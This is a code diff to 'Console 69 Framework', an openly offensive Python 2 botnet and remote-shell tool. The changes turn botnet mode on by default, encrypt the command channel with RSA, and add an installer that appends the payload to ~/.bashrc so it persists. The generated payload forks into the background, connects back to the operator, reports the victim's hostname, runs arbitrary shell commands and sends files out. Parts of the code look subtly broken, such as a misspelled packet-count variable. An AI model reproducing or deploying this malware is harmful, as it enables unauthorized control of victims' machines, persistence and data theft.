@@ -3,6 +3,7 @@
 ################## Console 69 Framework By Looper ######################
 ############################ 2017 (c) ################################## 
 
+# Imports
 import socket
 import time
 import threading
@@ -11,14 +12,20 @@ import subprocess
 import re
 import os
 import time
+from Crypto.Cipher import PKCS1_v1_5
+from Crypto.PublicKey import RSA
+from Crypto import Random
+
+# GLOBALS
 LHOST = ''
 LPORT = ''
 RHOST = ''
 RPORT = ''
-BOTNET_MODE = False
+BOTNET_MODE = True
 TGTS_CONNECTED = []
 STANDBY_HOSTS = []
 DOWNLOAD_PATH = '/root'
+TARGET_HOSTNAME = ""
 os.system("reset")
 OPTIONS = '''
 Options:
@@ -32,7 +39,6 @@ Options:
 	DOWNLOAD_PATH 	<PATH>	Use this function to set the path c69f will use
 	to download files from the infected machine.
 	help/option/show options Shows this message
-
   show:
 	LHOST 	Shows the IP set for LocalHost.
 	LPORT 	Shows the port set for LocalHost.
@@ -44,7 +50,6 @@ Options:
 	
 	listen	C69f will start listening for connections, in case BOTNET_MODE
 	is on, will start the botnet.
-
 	load configfile <PATH>	Will load the configurations form a file,
 	this file must have written the commands correctly
 	and have only 1 command per line.
@@ -53,17 +58,14 @@ Options:
 	set LHOST 192.168.1.2
 	set LPORT 31337
 	listen
-
 	create payload <PATH>	Will create a payload on the path you specify,
 	this payload will do a connection to your
 	computer so you can control it.
 	WARNING:
 	BEFORE YOU CREATE THE PAYLOAD YOU MUST SPECIFY LHOST,LPORT,
 	RPORT,BOTNET_MODE,ETC.
-
 	save configfile	<PATH>	This function will save the configurations 
 	you have set into the file you specified.
-
 Options once started a Botnet:
 	
 	show infected 	This command will show you all the machines that have
@@ -71,18 +73,17 @@ Options once started a Botnet:
 	connect <IP>	If the IP you wrote is infected, you can check it by
 	typing "show infected", you will connect to that machine,
 	and a shell will be dropped.
-
 Options once connected to the victim:
   NOTE:
 	You can use ALL Linux/Windows commands and also the following.
-
 	exit  You will disconnect from the target but you can connect later.
 	kill  You will disconnect from the target and the payload you
 	 installed on the victims computer will die.
 	download  <PATH>  You will download the file you specified in the path,
 	this file will be saved on the path you	set in DOWNLOAD_PATH.
-
 '''
+
+# A nice display of the title
 
 print chr(27)+"[0;91m"+"_______________________________________________________________________________"
 time.sleep(0.02)
@@ -112,7 +113,19 @@ print chr(27)+"[0;91m"+"________________________________________________________
 time.sleep(0.02)
 print "\n\n"
 
+# This function generates a installer which adds a line to the bashrc file so the virus is continiusly being executed
+def generateInstaller(path):
+	f = open(path, "w")
+	code = '''#!/usr/bin/env python
+import os
+dir = os.getcwd()
+os.system("echo 'python %s/c69payload.py' >> ~/.bashrc" % dir)
+	'''
+	os.system("chmod +x "+path)
+	f.write(code)
+	f.close()
 
+# This function is suposed to being able of downloading a file from the victim machine, but its still being developed
 def download(data, filename):
 	print "[*] Downloading %s to " % filename + DOWNLOAD_PATH
 	os.system("echo "" > %s/%s" % (DOWNLOAD_PATH, filename))
@@ -126,7 +139,8 @@ def download(data, filename):
 
 
 def create_payload(filename, code):		# This function generates the payload.
-	f = open(filename, 'w')
+	os.system("mkdir "+filename)
+	f = open(filename+"/c69payload.py", 'w')
 	f.write(code)
 
 def check_options():					# This function checks that, at least, LHOST & LPORT; are set
@@ -153,14 +167,15 @@ def check_options():					# This function checks that, at least, LHOST & LPORT; a
 		print "[!] no LHOST has been selected"
 		return 0
 
+# This function is called with a thread and listens to connections and then, adds the ip to the infected array
 def listen_botnet():
+	global TARGET_HOSTNAME
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
 		s.bind((LHOST, int(LPORT)))
 	except Exception, err:
-		print "[!] An error ocurred while binding to %s:%s" % (LHOST, LPORT)
 		p_continue = False
-		print err
+
 
 	while 1:
 		s.listen(1)
@@ -168,8 +183,10 @@ def listen_botnet():
 		if addr[0] not in TGTS_CONNECTED:
 			TGTS_CONNECTED.append(addr[0])
 		c.send(str(addr[0]))
+		TARGET_HOSTNAME = c.recv(1024)
 		c.close()
 
+# This function removes the device from the infected array, but doesn't close the connection
 def remove_infected(tgt):
 	i = 0
 	while 1:
@@ -178,9 +195,9 @@ def remove_infected(tgt):
 			break
 		else:
 			i+=1
-
+# This function starts the shell on the victim machine
 def tgt_connect_botnet(tgt):
-	global STANDBY_HOSTS
+	global STANDBY_HOSTS, TARGET_HOSTNAME
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	check = ''
 	try:
@@ -189,7 +206,6 @@ def tgt_connect_botnet(tgt):
 		check = s.recv(1024)
 	except socket.error:
 		print "[!] An error ocurred while connecting to "+tgt
-		print "PRESS [ENTER] TO CONTINUE"
 		i = 0
 		while i in range(len(TGTS_CONNECTED)):
 			if TGTS_CONNECTED[i] == tgt:
@@ -201,8 +217,15 @@ def tgt_connect_botnet(tgt):
 	if tgt in STANDBY_HOSTS:
 		just_continue = True
 	if check == 'READY' or just_continue == True:
-		s.send("PATH")
-		tgt_path = s.recv(1024)
+		random_generator = Random.new().read
+		sentinel = Random.new().read(4415000)
+		Akey = RSA.generate(4096, random_generator)
+		s.send(Akey.publickey().exportKey())
+		Vkey = RSA.importKey(s.recv(1000000))
+		ecipher = PKCS1_v1_5.new(Vkey)
+		dcipher = PKCS1_v1_5.new(Akey)
+		s.send(ecipher.encrypt("PATH"))
+		tgt_path = dcipher.decrypt(s.recv(10000000), sentinel)
 		while 1:
 			print chr(27)+"[1;91m"
 			cmd = raw_input("[%s:%s] $ " % (tgt, tgt_path))
@@ -210,21 +233,20 @@ def tgt_connect_botnet(tgt):
 			if cmd == "":
 				pass
 			elif cmd == 'exit':
-				s.send(cmd)
+				s.send(ecipher.encrypt(cmd))
 				s.close()
-				print "[-] Disconnected\nPRESS [ENTER] TO CONTINUE"
 				STANDBY_HOSTS.append(tgt)
 				start_botnet(True)
 			elif cmd == 'kill':
-				s.send(cmd)
+				s.send(ecipher.encrypt(cmd))
 				s.close()
 				remove_infected(tgt)
 				break
 			else:
-				s.send(cmd)
+				s.send(ecipher.encrypt(cmd))
 
 				if cmd.startswith("cd "):
-					response = s.recv(1024)
+					response = dcipher.decrypt(s.recv(10000000), sentinel)
 					if response.startswith("[!]"):
 						print response
 					else:
@@ -234,17 +256,25 @@ def tgt_connect_botnet(tgt):
 					if ' ' in filetodownload:
 						print "[!] Too much arguments for \"download\""
 					else:
-						data = s.recv(3000000)
+						data = dcipher.decrypt(s.recv(3000000), sentinel)
 						download(data, filetodownload)
 				else:
-					output = s.recv(30000)
+					output = dcipher.decrypt(s.recv(3000000), sentinel)
 					if output != '[OK]':
-						print output
+						if output == "[DIVIDED PACKETS]":
+							nPackets = dcipher.decrypt(s.recv(1000000), sentinel)
+							i = 1
+							while i in range(npackets):
+								print dcipher.decrypt(s.recv(10000000), sentinel)
+								i+=1
+						else:	
+							print output
 					else:
 						pass
 
+# This function starts the botnet
 def start_botnet(already_started):
-	global LHOST, LPORT, TGTS_CONNECTED
+	global LHOST, LPORT, TGTS_CONNECTED, TARGET_HOSTNAME
 
 	if check_options() == 1:
 		if already_started != True:
@@ -305,13 +335,13 @@ def start_botnet(already_started):
 							if len(TGTS_CONNECTED) == 0:
 								print "\nAny device infected\n"
 							while i in range(len(TGTS_CONNECTED)):
-								print "\n"+TGTS_CONNECTED[i]+"\n"
+								print "\n"+TGTS_CONNECTED[i]+"\t"+TARGET_HOSTNAME+"\n"
 								i+=1
 							
 						else:
 							print "[!] Unknown parameter: "+parameter
 					elif cmd == 'exit':
-						sys.exit()
+						raise(KeyboardInterrupt)
 
 					else:
 						i = 0
@@ -335,11 +365,6 @@ def start_botnet(already_started):
 							pass
 
 
-
-
-
-				
-								
 		except KeyboardInterrupt:
 			try:
 				c.close()
@@ -712,9 +737,7 @@ def main():
 									pass
 				
 								if check_options() == 1:
-									if not filename.endswith(".py"):
-										print "[!] %s changed to %s.py" % (filename,filename)
-										filename+='.py'
+									pass
 					
 								print "Creating payload"
 								print "Options:"
@@ -764,7 +787,6 @@ def start_command_line():
 				f = open(filename, 'r')
 				data = f.readlines()
 				c.send(str(data))
-
 			else:
 				proc2 = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 				output = proc2.stdout.read() + proc2.stderr.read()
@@ -774,7 +796,6 @@ def start_command_line():
 				''' % (LHOST, LPORT)
 								else:
 									code = '''#!/usr/bin/env python
-
 ############### Console 69 Payload By Looper ####################
 ######################## (c) 2017 ###############################
 import os
@@ -784,13 +805,14 @@ import subprocess
 import sys
 import re
 from multiprocessing import Process
+from Crypto.Cipher import PKCS1_v1_5
+from Crypto.PublicKey import RSA
+from Crypto import Random
+
 server_ip = ''
 server_port = %s
 rport = %s
 rhost = "%s"
-
-
-
 def start_command_line():
 	global server_ip, server_port, rport, rhost
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -802,9 +824,17 @@ def start_command_line():
 			server_port+=1
 	s.listen(1)
 	c, addr = s.accept()
+	random_generator = Random.new().read
+	sentinel = Random.new().read(4115)
+	Vkey = RSA.generate(4096, random_generator)
 	c.send("READY")
+	Akey = RSA.importKey(c.recv(1000000))
+	c.send(Vkey.publickey().exportKey())
+	ecipher = PKCS1_v1_5.new(Akey)
+	dcipher = PKCS1_v1_5.new(Vkey)
+
 	while 1:
-		cmd = c.recv(1024)
+		cmd = dcipher.decrypt(c.recv(10000000), sentinel)
 		if cmd:
 			if cmd == 'exit':
 				dta = ''
@@ -812,54 +842,67 @@ def start_command_line():
 					c.close()
 					s.close()
 					infected()
-
 			elif cmd == 'kill':
 				c.close()
 				s.close()
 				exit(0)
 			elif cmd == "PATH":
-				c.send(os.getcwd())
+				c.send(ecipher.encrypt(os.getcwd()))
 			elif cmd.startswith("cd "):
 				try:
 					os.chdir(cmd[3:])
-					c.send(os.getcwd())
+					c.send(ecipher.encrypt(os.getcwd()))
 				except:
-					c.send("[!] "+cmd[3:]+" does not exist")
+					c.send(ecipher.encrypt("[!] "+cmd[3:]+" does not exist"))
 			elif cmd.startswith("download "):
 				filename = cmd[9:]
 				f = open(filename, 'r')
 				data = f.readlines()
-				c.send(str(data))
-
+				c.send(ecipher.encrypt(str(data)))
 			else:
 				proc2 = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 				output = proc2.stdout.read() + proc2.stderr.read()
-				c.send(output)
+				if len(output) <= 460:
+					c.send(ecipher.encrypt(output))
+				else:
+					c.send(ecipher.encrypt("[DIVIDED PACKETS]"))
+					nPackets = len(output) / 460
+					if len(output) % 460 != 0:
+						nPackets +=1
+					c.send(ecipher.encrypt(str(nPackets)))
+					i = 1
+					j = 0
+					while i in range(nPackets):
+						try:
+							print output[j:j+460]
+							c.send(ecipher.encrypt(output[j:j+460]))
+						except IndexError:
+							c.send(ecipher.encrypt(output[j:]))
+						i+=1
+						j+=461 
 				if output == "":
-					c.send("[OK]")
+					c.send(ecipher.encrypt("[OK]"))
 def infected():
 	global server_ip, server_port, rport, rhost
 	while 1:
 		try:
 			cnn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 			cnn.connect((rhost, rport))
-
 			server_ip = cnn.recv(1024)
-
+			cnn.send(socket.gethostname())
 			cnn.close()
 			break
 		except:
 			pass
-
 	start_command_line()
-
 newRef = os.fork()
 if newRef == 0:
 	infected()
+
 ''' % (RPORT, LPORT, LHOST)
 								create_payload(filename,code)
 				
-								f = open(filename, 'r')
+								f = open(filename+"/c69payload.py", 'r')
 								if f.readlines() == "":
 									try:
 										while 1:
@@ -872,7 +915,8 @@ if newRef == 0:
 										exit(0)
 								print "[+] Payload created."
 								print "[+] Payload generated on "+filename
-								os.system("chmod 755 %s" % filename)
+								os.system("chmod 755 %s" % filename+"/c69payload.py")
+								generateInstaller(filename+"/installer.py")
 							else:
 								print "[!] Unknown parameter: "+parameter
 
@@ -963,8 +1007,7 @@ if newRef == 0:
 				
 				if check_options() == 1:
 					if not filename.endswith(".py"):
-						print "[!] %s changed to %s.py" % (filename,filename)
-						filename+='.py'
+						pass
 					
 					print "Creating payload"
 					print "Options:"
@@ -1014,18 +1057,15 @@ def start_command_line():
 				f = open(filename, 'r')
 				data = f.readlines()
 				c.send(str(data))
-
 			else:
 				proc2 = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 				output = proc2.stdout.read() + proc2.stderr.read()
 				sock.send(output)
 				if output == '':
 					sock.send("[OK]")
-
 				''' % (LHOST, LPORT)
 					else:
 						code = '''#!/usr/bin/env python
-
 ############### Console 69 Payload By Looper ####################
 ######################## (c) 2017 ###############################
 import os
@@ -1035,13 +1075,14 @@ import subprocess
 import sys
 import re
 from multiprocessing import Process
+from Crypto.Cipher import PKCS1_v1_5
+from Crypto.PublicKey import RSA
+from Crypto import Random
+
 server_ip = ''
 server_port = %s
 rport = %s
 rhost = "%s"
-
-
-
 def start_command_line():
 	global server_ip, server_port, rport, rhost
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1053,9 +1094,17 @@ def start_command_line():
 			server_port+=1
 	s.listen(1)
 	c, addr = s.accept()
+	random_generator = Random.new().read
+	sentinel = Random.new().read(4115)
+	Vkey = RSA.generate(4096, random_generator)
 	c.send("READY")
+	Akey = RSA.importKey(c.recv(1000000))
+	c.send(Vkey.publickey().exportKey())
+	ecipher = PKCS1_v1_5.new(Akey)
+	dcipher = PKCS1_v1_5.new(Vkey)
+
 	while 1:
-		cmd = c.recv(1024)
+		cmd = dcipher.decrypt(c.recv(10000000), sentinel)
 		if cmd:
 			if cmd == 'exit':
 				dta = ''
@@ -1063,67 +1112,56 @@ def start_command_line():
 					c.close()
 					s.close()
 					infected()
-
 			elif cmd == 'kill':
 				c.close()
 				s.close()
 				exit(0)
 			elif cmd == "PATH":
-				c.send(os.getcwd())
+				c.send(ecipher.encrypt(os.getcwd()))
 			elif cmd.startswith("cd "):
 				try:
 					os.chdir(cmd[3:])
-					c.send(os.getcwd())
+					c.send(ecipher.encrypt(os.getcwd()))
 				except:
-					c.send("[!] "+cmd[3:]+" does not exist")
+					c.send(ecipher.encrypt("[!] "+cmd[3:]+" does not exist"))
 			elif cmd.startswith("download "):
 				filename = cmd[9:]
 				f = open(filename, 'r')
 				data = f.readlines()
-				c.send(str(data))
-
+				c.send(ecipher.encrypt(str(data)))
 			else:
 				proc2 = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 				output = proc2.stdout.read() + proc2.stderr.read()
-				c.send(output)
+				c.send(ecipher.encrypt(output))
 				if output == "":
-					c.send("[OK]")
+					c.send(ecipher.encrypt("[OK]"))
 def infected():
 	global server_ip, server_port, rport, rhost
 	while 1:
 		try:
 			cnn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 			cnn.connect((rhost, rport))
-
 			server_ip = cnn.recv(1024)
-
+			cnn.send(socket.gethostname())
 			cnn.close()
 			break
 		except:
 			pass
-
 	start_command_line()
-
 newRef = os.fork()
 if newRef == 0:
 	infected()
+
 ''' % (RPORT, LPORT, LHOST)
 					create_payload(filename,code)
 				
-					f = open(filename, 'r')
+					f = open(filename+"/c69payload.py", 'r')
 					if f.readlines() == "":
-						try:
-							while 1:
-								print "[!] An error ocurred while writing the program to: "+filename
-								filename = raw_input("Please type the FULL PATH to the file: ")
-								f = open(filename, 'r')
-								if f.readlines() != "":
-									break
-						except KeyboardInterrupt:
-							exit(0)
+						pass
 					print "[+] Payload created."
 					print "[+] Payload generated on "+filename
-					os.system("chmod 755 %s" % filename)
+					os.system("chmod 755 %s" % filename+"/c69payload.py")
+					generateInstaller(filename+"/installer.py")
 			else:
 				print "[!] Unknown parameter: "+parameter
 
